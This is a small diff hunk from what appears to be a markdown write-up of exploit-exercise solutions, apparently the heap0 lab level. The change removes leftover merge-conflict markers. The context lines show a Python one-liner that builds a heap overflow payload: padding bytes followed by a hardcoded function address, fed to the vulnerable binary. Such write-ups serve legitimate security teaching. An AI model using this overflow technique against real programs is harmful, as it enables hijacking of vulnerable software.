@@ -1465,6 +1465,4 @@ python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
 ./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
 ```
 
-=======
-exploit exercises write ups
->>>>>>> 05dc9f8578d356a0aeb574c41e0e0d686bfbd10e
+
